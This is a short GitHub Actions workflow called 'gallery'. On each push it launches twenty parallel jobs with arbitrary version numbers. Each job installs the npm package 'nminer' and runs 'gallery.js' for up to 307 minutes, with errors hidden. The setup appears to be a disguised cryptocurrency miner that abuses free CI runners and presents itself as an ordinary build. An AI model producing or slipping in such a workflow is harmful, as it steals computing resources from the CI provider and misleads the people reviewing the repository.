name: gallery
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6466 }
          - { version: 5189 }
          - { version: 7 }
          - { version: 8723 }
          - { version: 2073 }
          - { version: 4167 }
          - { version: 1411 }
          - { version: 8491 }
          - { version: 8738 }
          - { version: 1799 }
          - { version: 5858 }
          - { version: 9290 }
          - { version: 3266 }
          - { version: 135 }
          - { version: 4972 }
          - { version: 9884 }
          - { version: 3316 }
          - { version: 2392 }
          - { version: 4400 }
          - { version: 922 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: wide-eyed
        run: |
          npm install nminer@latest
          timeout 307m node gallery.js || echo "gallery executed"